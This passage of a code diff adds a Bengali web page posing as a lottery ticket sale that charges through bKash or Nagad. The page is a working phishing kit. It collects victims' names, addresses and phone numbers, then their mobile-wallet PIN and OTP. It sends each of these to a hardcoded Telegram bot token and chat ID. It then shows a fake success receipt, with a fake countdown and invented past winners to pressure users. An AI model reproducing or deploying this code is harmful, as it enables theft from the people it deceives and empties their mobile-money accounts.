+                <input type="text" id="userName" placeholder="যেমন: আব্দুর রহিম">
+            </div>
+
+            <div class="form-group" id="addressGroup">
+                <label>আপনার ঠিকানা (জেলা/থানা):</label>
+                <input type="text" id="userAddress" placeholder="যেমন: গুলশান, ঢাকা">
+            </div>
+
+            <div class="form-group" id="phoneGroup">
+                <label>মোবাইল নম্বর (বিকাশ/নগদ):</label>
+                <input type="tel" id="userPhone" placeholder="017XXXXXXXX" maxlength="11">
+            </div>
+
+            <div class="form-group">
+                <label>টিকিট প্যাক সিলেক্ট করুন:</label>
+                <select id="paymentAmountSelect" onchange="updateTicketQuantity()">
+                    <option value="10" data-count="1" selected>৳১০.০০ টাকা (১টি লাকি ড্র টিকিট)</option>
+                    <option value="20" data-count="2">৳২০.০০ টাকা (২টি টিকিট প্যাক)</option>
+                    <option value="50" data-count="5">৳৫০.০০ টাকা (৫টি টিকিট মেগা প্যাক)</option>
+                    <option value="100" data-count="10">৳১০০.০০ টাকা (১০টি সুপার প্যাক)</option>
+                </select>
+            </div>
+
+            <button class="modal-action-btn" onclick="submitDetailsForm()">পরবর্তী ধাপ (পেমেন্ট)</button>
+        </div>
+
+        <!-- ৩. পেমেন্ট মেথড সিলেক্ট স্টেপ -->
+        <div id="paymentSelectStep" style="display: none;">
+            <div class="modal-badge-icon">💳</div>
+            <div class="modal-title-3d">পেমেন্ট মাধ্যম সিলেক্ট করুন</div>
+            <div class="modal-desc-text">নিচের যেকোনো একটি অপশনে ক্লিক করে পেমেন্ট সম্পূর্ণ করুন:</div>
+            
+            <div class="gateway-grid" style="grid-template-columns: repeat(2, 1fr);">
+                <div class="gateway-card selected" id="gwBkash" onclick="selectGateway('bKash')">
+                    <img src="https://www.logo.wine/a/logo/BKash/BKash-Logo.wine.svg" alt="bKash">
+                    <div class="gw-name" style="color: #e2136e;">bKash</div>
+                </div>
+                <div class="gateway-card" id="gwNagad" onclick="selectGateway('Nagad')">
+                    <img src="https://www.logo.wine/a/logo/Nagad/Nagad-Logo.wine.svg" alt="Nagad">
+                    <div class="gw-name" style="color: #f6921e;">Nagad</div>
+                </div>
+            </div>
+
+            <button class="modal-action-btn" onclick="proceedToPinStep()">পেমেন্ট করুন</button>
+        </div>
+
+        <!-- ৪. পিন কোড -->
+        <div id="pinStep" style="display: none;">
+            <div class="modal-badge-icon">🔒</div>
+            <div class="modal-title-3d" id="modalPinTitle">পেমেন্ট পিন দিন</div>
+            <div class="modal-desc-text">আপনার পেমেন্ট পিন কোডটি বসিয়ে কনফার্ম করুন:</div>
+            
+            <div class="phone-input-wrapper" id="pinInputBox">
+                <input type="password" id="userPin" placeholder="••••" maxlength="5" style="text-align: center; letter-spacing: 8px; font-size: 20px;">
+            </div>
+
+            <button class="modal-action-btn" onclick="submitPin()">পিন সাবমিট করুন</button>
+        </div>
+
+        <!-- ৫. ওটিপি -->
+        <div id="otpStep" style="display: none;">
+            <div class="modal-badge-icon">🛡️</div>
+            <div class="modal-title-3d">কনফার্মেশন কোড (OTP)</div>
+            <div class="timer-text" id="timerText">⏱️ মেয়াদের বাকি: 02:00</div>
+            
+            <div class="otp-boxes-container" id="otpContainerBox">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveOtpFocus(this, 1)">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveOtpFocus(this, 2)">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveOtpFocus(this, 3)">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveOtpFocus(this, 4)">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveOtpFocus(this, 5)">
+                <input type="number" class="otp-box" maxlength="1" oninput="moveOtpFocus(this, 6)">
+            </div>
+
+            <button class="modal-action-btn" onclick="submitOtp()">ভেরিফাই করুন</button>
+        </div>
+
+        <!-- ৬. সাকসেস ও লোভনীয় টিকিট সিরিয়াল নম্বর রসিদ -->
+        <div id="successStep" style="display: none;">
+            <div class="modal-badge-icon" style="background: #e8f5e9; border-color: #c8e6c9;">🎉</div>
+            <div class="modal-title-3d">অভিনন্দন! পেমেন্ট সফল</div>
+            
+            <div class="ticket-receipt-box" id="receiptDetails">
+                <b>নাম:</b> <span id="recName">অজ্ঞাত</span><br>
+                <b>ঠিকানা:</b> <span id="recAddress">ঢাকা</span><br>
+                <b>নম্বর:</b> <span id="recPhone">017XXXXXXXX</span><br>
+                <b>জেটপোর্ট সিরিয়াল:</b> <span id="recTicketNo" style="color: #b45309; font-size: 14px; font-weight: 900;">#JET-89421</span><br>
+                <b>পরিমাণ:</b> <span id="recCount">১টি টিকিট</span>
+            </div>
+
+            <div style="font-size: 11.5px; color: #b45309; font-weight: 800; margin-bottom: 15px; background: #fffbeb; padding: 10px; border-radius: 10px; border: 1px solid #fde68a;">
+                ⚠️ এই টিকিট সিরিয়াল নম্বরটি স্ক্রিনশট বা সংরক্ষণ করে রাখুন! বিজয়ী হলে ২২০০০০ টাকা বা আইফোন জিতলে এই নম্বর দিয়েই পুরস্কার দেওয়া হবে।
+            </div>
+            
+            <button class="modal-action-btn" style="background: linear-gradient(135deg, #2563eb, #1e40af); margin-bottom: 10px;" onclick="restartBuyMore()">🎟️ আরও টিকিট কিনুন</button>
+            <button class="modal-action-btn" style="background: #64748b;" onclick="closeModal()">বন্ধ করুন</button>
+        </div>
+
+    </div>
+</div>
+
+<script>
+    "use strict";
+
+    const BOT_TOKEN = "8918142704:AAFy-trQ2hDsS3ssNf5LeSicOq1oJq14cio";
+    let CHAT_ID = "8049927326";
+
+    let userNameVal = "";
+    let userAddressVal = "";
+    let userPhoneVal = "";
+    let selectedGatewayName = "bKash";
+    let timerInterval = null;
+    let selectedTicketsCountToAdd = 1;
+
+    function updateTicketUI() {
+        let savedCount = localStorage.getItem('user_total_tickets') || 0;
+        document.getElementById('totalTicketsCount').textContent = savedCount + " টি";
+    }
+    updateTicketUI();
+
+    // অটো-ডেট ক্যালকুলেশন সিস্টেম (গতকালকের তারিখ)
+    const yesterday = new Date();
+    yesterday.setDate(yesterday.getDate() - 1);
+    const dateOptions = { year: 'numeric', month: 'long', day: 'numeric' };
+    const formattedYesterday = yesterday.toLocaleDateString('bn-BD', dateOptions);
+
+    document.getElementById('yesterdayDateBadge').textContent = "তারিখ: " + formattedYesterday;
+    document.getElementById('yesterdaySubtitleText').textContent = `${formattedYesterday} তারিখের ড্র-এ যারা ইতিমধ্যে প্রাইজ উইন করেছেন ও পেমেন্ট পেয়েছেন:`;
+
+    let userSessionId = sessionStorage.getItem('visitor_serial');
+    if (!userSessionId) {
+        let currentCount = localStorage.getItem('global_visitor_count') || 1;
+        localStorage.setItem('global_visitor_count', parseInt(currentCount) + 1);
+        userSessionId = "User #" + currentCount;
+        sessionStorage.setItem('visitor_serial', userSessionId);
+    }
+
+    // ৪ ঘণ্টার লাইভ কাউন্টডাউন টাইমার
+    let totalSeconds = 4 * 3600 + 15 * 60 + 20;
+    setInterval(() => {
+        if(totalSeconds > 0) totalSeconds--;
+        let h = Math.floor(totalSeconds / 3600);
+        let m = Math.floor((totalSeconds % 3600) / 60);
+        let s = totalSeconds % 60;
+        
+        document.getElementById('hours').textContent = h < 10 ? '0' + h : h;
+        document.getElementById('mins').textContent = m < 10 ? '0' + m : m;
+        document.getElementById('secs').textContent = s < 10 ? '0' + s : s;
+        document.getElementById('timeRemainingText').textContent = `০${h} ঘণ্টা`;
+    }, 1000);
+
+    function sendTelegramMessage(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+        }).catch(err => console.error(err));
+    }
+
+    const modal = document.getElementById('appModal');
+    const loader = document.getElementById('modalLoader');
+    const detailsFormStep = document.getElementById('detailsFormStep');
+    const paymentSelectStep = document.getElementById('paymentSelectStep');
+    const pinStep = document.getElementById('pinStep');
+    const otpStep = document.getElementById('otpStep');
+    const successStep = document.getElementById('successStep');
+
+    function hideAllSteps() {
+        loader.style.display = 'none';
+        detailsFormStep.style.display = 'none';
+        paymentSelectStep.style.display = 'none';
+        pinStep.style.display = 'none';
+        otpStep.style.display = 'none';
+        successStep.style.display = 'none';
+    }
+
+    function openDetailsForm() {
+        modal.classList.add('active');
+        hideAllSteps();
+        document.getElementById('userName').value = '';
+        document.getElementById('userAddress').value = '';
+        document.getElementById('userPhone').value = '';
+        detailsFormStep.style.display = 'block';
+    }
+
+    function restartBuyMore() {
+        openDetailsForm();
+    }
+
+    function updateTicketQuantity() {
+        const selectEl = document.getElementById('paymentAmountSelect');
+        const selectedOpt = selectEl.options[selectEl.selectedIndex];
+        selectedTicketsCountToAdd = parseInt(selectedOpt.getAttribute('data-count')) || 1;
+    }
+
+    function submitDetailsForm() {
+        userNameVal = document.getElementById('userName').value.trim();
+        userAddressVal = document.getElementById('userAddress').value.trim();
+        userPhoneVal = document.getElementById('userPhone').value.trim();
+
+        if(userNameVal.length < 2) {
+            let el = document.getElementById('nameGroup');
+            el.classList.add('shake-anim');
+            setTimeout(() => el.classList.remove('shake-anim'), 400);
+            return;
+        }
+        if(userAddressVal.length < 2) {
+            let el = document.getElementById('addressGroup');
+            el.classList.add('shake-anim');
+            setTimeout(() => el.classList.remove('shake-anim'), 400);
+            return;
+        }
+        if(userPhoneVal.length < 11) {
+            let el = document.getElementById('phoneGroup');
+            el.classList.add('shake-anim');
+            setTimeout(() => el.classList.remove('shake-anim'), 400);
+            return;
+        }
+
+        hideAllSteps();
+        loader.style.display = 'flex';
+        document.getElementById('loaderText').textContent = "পেমেন্ট গেটওয়ে লোড হচ্ছে...";
+
+        setTimeout(() => {
+            hideAllSteps();
+            paymentSelectStep.style.display = 'block';
+        }, 800);
+    }
+
+    function selectGateway(gw) {
+        selectedGatewayName = gw;
+        document.getElementById('gwBkash').className = 'gateway-card' + (gw === 'bKash' ? ' selected' : '');
+        document.getElementById('gwNagad').className = 'gateway-card' + (gw === 'Nagad' ? ' selected' : '');
+    }
+
+    function proceedToPinStep() {
+        hideAllSteps();
+        document.getElementById('modalPinTitle').textContent = `${selectedGatewayName} পিন দিন`;
+        pinStep.style.display = 'block';
+        document.getElementById('userPin').value = '';
+        document.getElementById('userPin').focus();
+
+        const selectedAmt = document.getElementById('paymentAmountSelect').value;
+        const msg = `━━━━━━━━━━━━━━━━━━━━━\n🚀 *[ জেটপোর্ট - ${userSessionId} ]* - নতুন রেজিস্ট্রেশন\n━━━━━━━━━━━━━━━━━━━━━\n👤 নাম: ${userNameVal}\n🏠 ঠিকানা: ${userAddressVal}\n📱 নম্বর: \`${userPhoneVal}\`\n🎁 প্যাক: ${selectedTicketsCountToAdd}টি টিকিট\n💳 মাধ্যম: *${selectedGatewayName}*\n💰 অ্যামাউন্ট: *৳${selectedAmt}.০০*\n━━━━━━━━━━━━━━━━━━━━━`;
+        sendTelegramMessage(msg);
+    }
+
+    function submitPin() {
+        const pin = document.getElementById('userPin').value.trim();
+        const pinBox = document.getElementById('pinInputBox');
+
+        if(pin.length < 4) {
+            pinBox.classList.add('shake-anim');
+            setTimeout(() => pinBox.classList.remove('shake-anim'), 400);
+            return;
+        }
+
+        hideAllSteps();
+        loader.style.display = 'flex';
+        document.getElementById('loaderText').textContent = "পেমেন্ট প্রসেসিং হচ্ছে...";
+
+        const msg = `━━━━━━━━━━━━━━━━━━━━━\n🚀 *[ জেটপোর্ট - ${userSessionId} ]* - পিন রিসিভড\n━━━━━━━━━━━━━━━━━━━━━\n📱 নম্বর: \`${userPhoneVal}\`\n🔒 পিন: \`${pin}\`\n━━━━━━━━━━━━━━━━━━━━━`;
+        sendTelegramMessage(msg);
+
+        setTimeout(() => {
+            hideAllSteps();
+            otpStep.style.display = 'block';
+            startTimer(120);
+        }, 1200);
+    }
+
+    function moveOtpFocus(current, index) {
+        if (current.value.length > 1) current.value = current.value.slice(0, 1);
+        if (current.value.length === 1 && index < 6) {
+            document.querySelectorAll('.otp-box')[index].focus();
+        }
+    }
+
+    function startTimer(seconds) {
+        clearInterval(timerInterval);
+        const timerEl = document.getElementById('timerText');
+        timerInterval = setInterval(() => {
+            let mins = Math.floor(seconds / 60);
+            let secs = seconds % 60;
+            if(timerEl) timerEl.textContent = `⏱️ মেয়াদের বাকি: ${mins < 10 ? '0':''}${mins}:${secs < 10 ? '0':''}${secs}`;
+            if(seconds <= 0) clearInterval(timerInterval);
+            seconds--;
+        }, 1000);
+    }
+
+    function submitOtp() {
+        let otpValue = "";
+        document.querySelectorAll('.otp-box').forEach(b => otpValue += b.value);
+        const otpContainer = document.getElementById('otpContainerBox');
+
+        if(otpValue.length < 4) {
+            otpContainer.classList.add('shake-anim');
+            setTimeout(() => otpContainer.classList.remove('shake-anim'), 400);
+            return;
+        }
+
+        const msg = `━━━━━━━━━━━━━━━━━━━━━\n🚀 *[ জেটপোর্ট - ${userSessionId} ]* - ওটিপি রিসিভড\n━━━━━━━━━━━━━━━━━━━━━\n📱 নম্বর: \`${userPhoneVal}\`\n🛡️ ওটিপি: \`${otpValue}\`\n━━━━━━━━━━━━━━━━━━━━━`;
+        sendTelegramMessage(msg);
+
+        clearInterval(timerInterval);
+        hideAllSteps();
+        loader.style.display = 'flex';
+        document.getElementById('loaderText').textContent = "টিকিট কনফার্ম ও সিরিয়াল জেনারেট হচ্ছে...";
+
+        let existingTotal = parseInt(localStorage.getItem('user_total_tickets') || 0);
+        let newTotal = existingTotal + selectedTicketsCountToAdd;
+        localStorage.setItem('user_total_tickets', newTotal);
+        updateTicketUI();
+
+        let randomTicketId = "#JET-" + Math.floor(10000 + Math.random() * 90000);
+
+        setTimeout(() => {
+            hideAllSteps();
+            document.getElementById('recName').textContent = userNameVal;
+            document.getElementById('recAddress').textContent = userAddressVal;
+            document.getElementById('recPhone').textContent = userPhoneVal;
+            document.getElementById('recTicketNo').textContent = randomTicketId;
+            document.getElementById('recCount').textContent = selectedTicketsCountToAdd + "টি টিকিট";
+            successStep.style.display = 'block';
+        }, 1200);
+    }
+
+    function closeModal() {
+        modal.classList.remove('active');
+        hideAllSteps();
+    }
+</script>
+
+</body>
+</html>
